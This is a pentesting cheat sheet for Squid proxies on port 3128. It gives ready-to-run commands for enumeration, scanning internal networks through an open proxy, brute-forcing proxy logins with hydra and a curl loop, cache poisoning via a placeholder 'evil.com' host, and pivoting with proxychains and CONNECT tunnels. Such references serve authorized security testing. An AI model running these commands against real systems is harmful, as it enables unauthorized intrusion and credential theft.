# Port 3128 - Squid Proxy

## Table of Contents

- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Pivoting](#pivoting)

---

## Enumeration

### Quick Check (One-liner)

```shell
curl -x http://$rhost:3128 http://ifconfig.me && nmap -p 3128 --script "http-open-proxy" $rhost
```

### Nmap Scripts

```shell
nmap -sV -sC -p3128 $rhost
nmap -p3128 --script "http-open-proxy" $rhost
```

### Banner Grabbing

```shell
nc -vn $rhost 3128
curl -I http://$rhost:3128/
```

### Version Detection

```shell
curl -s -I http://$rhost:3128/ | grep -i "server\|via"
```

### Check Proxy Type

```shell
# HTTP Proxy
curl -x http://$rhost:3128 http://ifconfig.me

# HTTPS Proxy
curl -x https://$rhost:3128 https://ifconfig.me
```

---

## Exploitation

### Test Open Proxy

```shell
# External access
curl -x http://$rhost:3128 http://ifconfig.me

# Internal network scanning
curl -x http://$rhost:3128 http://127.0.0.1
curl -x http://$rhost:3128 http://192.168.1.1
curl -x http://$rhost:3128 http://10.0.0.1

# Access internal services
curl -x http://$rhost:3128 http://localhost:8080
curl -x http://$rhost:3128 http://internal-server/
```

### Port Scanning via Proxy

```shell
# Using proxychains
echo "http $rhost 3128" >> /etc/proxychains4.conf
proxychains nmap -sT -Pn 192.168.1.0/24

# Using curl
for port in 21 22 23 25 80 443 445 3389; do
  curl -s -x http://$rhost:3128 http://internal:$port/ -o /dev/null -w "%{http_code} - Port $port\n"
done
```

### Brute Force Authentication

```shell
# Hydra
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -P /usr/share/wordlists/rockyou.txt \
  $rhost http-proxy /

# Custom curl script
while read user; do
  while read pass; do
    response=$(curl -s -o /dev/null -w "%{http_code}" -x http://$user:$pass@$rhost:3128 http://ifconfig.me)
    if [ "$response" != "407" ]; then
      echo "[+] Found: $user:$pass"
    fi
  done < passwords.txt
done < users.txt
```

### Cache Poisoning

```shell
# Send malicious request to poison cache
curl -x http://$rhost:3128 -H "Host: target.com" http://evil.com/malicious

# Check cached content
curl -x http://$rhost:3128 http://target.com/cached-page
```

### Squid CVEs

```shell
# CVE-2019-12526 - Heap buffer overflow
# CVE-2020-15049 - HTTP Request Smuggling
# CVE-2020-25097 - HTTP Request Splitting

# Check version for vulnerabilities
curl -s -I http://$rhost:3128/ | grep Server
searchsploit squid
```

---

## Pivoting

### Proxychains Configuration

```shell
# /etc/proxychains4.conf
[ProxyList]
http $rhost 3128
# With authentication
# http $rhost 3128 username password
```

### Use with Various Tools

```shell
# SSH through proxy
proxychains ssh user@internal_host

# Metasploit
setg Proxies http:$rhost:3128

# Web browser
export http_proxy=http://$rhost:3128
export https_proxy=http://$rhost:3128
```

### CONNECT Method Tunneling

```shell
# Create tunnel via CONNECT
curl -x http://$rhost:3128 --proxytunnel http://internal:22

# Manual CONNECT
nc $rhost 3128
CONNECT internal:22 HTTP/1.1
Host: internal:22
```

---

## Configuration Files

```shell
# Squid config locations
/etc/squid/squid.conf
/etc/squid3/squid.conf
/usr/local/squid/etc/squid.conf

# Cache directory
/var/spool/squid/
/var/cache/squid/

# Logs
/var/log/squid/access.log
/var/log/squid/cache.log
```

### Interesting Config Settings

```shell
# Check ACL rules
grep -E "^acl|^http_access" /etc/squid/squid.conf

# Check allowed ports
grep -E "^ssl_ports|^safe_ports" /etc/squid/squid.conf
```

---

## Tools

- proxychains: https://github.com/haad/proxychains
- Burp Suite (upstream proxy)
- nikto with proxy support

---

## References

- [HackTricks - Squid](https://book.hacktricks.wiki/network-services-pentesting/3128-pentesting-squid.html)
